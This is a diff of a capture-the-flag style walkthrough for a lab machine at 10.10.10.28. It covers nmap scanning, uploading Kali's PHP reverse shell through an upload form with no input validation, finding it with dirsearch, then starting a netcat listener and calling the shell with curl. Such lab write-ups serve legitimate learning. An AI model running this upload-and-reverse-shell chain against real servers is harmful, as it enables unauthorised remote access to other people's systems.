@@ -3,6 +3,7 @@
 # Enumeration 
 
 Step 1: Nmap Scan
+
   - First we are going to run a nmap scan
     -       sudo nmap -sS -A 10.10.10.28
 
@@ -109,11 +110,15 @@ Step 3: Burp Suite
 
 # FootHold
   - Now we are going to focus on gaining a foot hold into thier network and possible gain a persistant connection on         their machine. 
+  - 
 Step 1: Testing Input Validation
-  - To do this we are going to test to if the developer of their webage left anything out. Since we are trying to upload     a file we can see if they forgot or ignored to add user input validiation to their web server/web page. 
+
+  - To do this we are going to test to if the developer of their webage left anything out. Since we are trying to           upload a file we can see if they forgot or ignored to add user input validiation to their web server/web page. 
     -  Check out this link if you want to learn more about input validation
        https://www.whitehatsec.com/glossary/content/input-validation
+       
 Step 2: Uploading a reverse shell
+
   - We are going to try to upload a php reverse shell.
     - Kali Linux already has a php reverse Shell that we can use in /usr/share/webshells/php/php-reverse-shell.ph
       - Make sure that before you upload the reverse shell you update the IP address and the port number with nano.
@@ -124,15 +129,25 @@ Step 2: Uploading a reverse shell
       ![image](https://user-images.githubusercontent.com/29686845/133001076-a213148f-b1d7-4ddb-a525-56ee140b8d37.png)
       ![image](https://user-images.githubusercontent.com/29686845/133001094-8b15c08f-bced-4046-91f2-d35c023c7a03.png)
     - Success we were able to upload the php file.
+
+Step 3: finding and using our reverse shell. 
+
   - We now have our reverse shell uploaded we need to figure out where it is and how we can access it.
     - Luckily for us we can use the tool dirsearch. to do this run the following commands. 
       - To get dirsearch run the follwowing command.
       -       git clone https://github.com/maurosoria/dirsearch.git
       - cd to the directory you put git clone in. (I am moving everything into opt) 
-    - once we are there we are going to run our dirsearch.py with the commmand below
+    - once we are there we are going to run our dirsearch.py with the commmand below.
     -       sudo python3 dirsearch.py -u http://10.10.10.28 -e php
     - After running this command we will see the output showing all directories within the ip 10.10.10.28
       ![image](https://user-images.githubusercontent.com/29686845/133331077-d8c817fc-6695-4da9-88d3-43eb750346f5.png)
-    - This shows us an upload directory. 
-    - 
+    - This shows us an upload directory. (This is probably the directory where we uploaded our reverse shell file)
+  - Now that we have found what directory that our file is in lets see if we can activate our reverse shell that we         have previously updated. 
 
+Step 4: Calling our Reverse shell.
+
+  - First we want to set up a listner using netcat
+    -     nc -lvnp 4444
+  - Next we want to call on our command using the curl command.
+    -     curl http://10.10.10.28/uploads/php-reverse-shell.php
+      - if you nammed your file anything else use the name of the file you uploaded at the end of the path
